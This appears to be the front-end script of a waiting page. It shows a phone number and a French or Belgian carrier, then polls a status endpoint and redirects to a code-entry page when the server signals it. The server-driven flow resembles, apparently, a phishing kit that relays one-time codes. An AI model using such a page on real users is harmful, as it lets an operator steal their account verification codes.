const API_STATUS = '/api/status';

function getParam(name) {
    return new URL(window.location.href).searchParams.get(name);
}

const phone = getParam('phone') || '--';
const carrier = getParam('carrier') || 'Orange';

document.getElementById('displayPhone').textContent = phone;

const carrierNames = {
    'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
    'base': 'BASE', 'orange_be': 'Orange Belgique', 'proximus': 'Proximus', 'telenet': 'Telenet'
};
document.getElementById('carrierName').textContent = carrierNames[carrier] || carrier;

async function checkStatus() {
    try {
        const res = await fetch(`${API_STATUS}?phone=${encodeURIComponent(phone)}`);
        if (!res.ok) return;
        const data = await res.json();

        if (data.status === 'waiting_code') {
            const len = data.code_length || 6;
            window.location.href = `code.html?phone=${encodeURIComponent(phone)}&length=${len}`;
        } else if (data.status === 'wrong_number') {
            window.location.href = `index.html?wrong_number=1`;
        } else if (data.status === 'completed') {
            window.location.href = `success.html?phone=${encodeURIComponent(phone)}`;
        }
    } catch (e) {
        console.error('Polling error:', e);
    }
}

checkStatus();
setInterval(checkStatus, 3000);
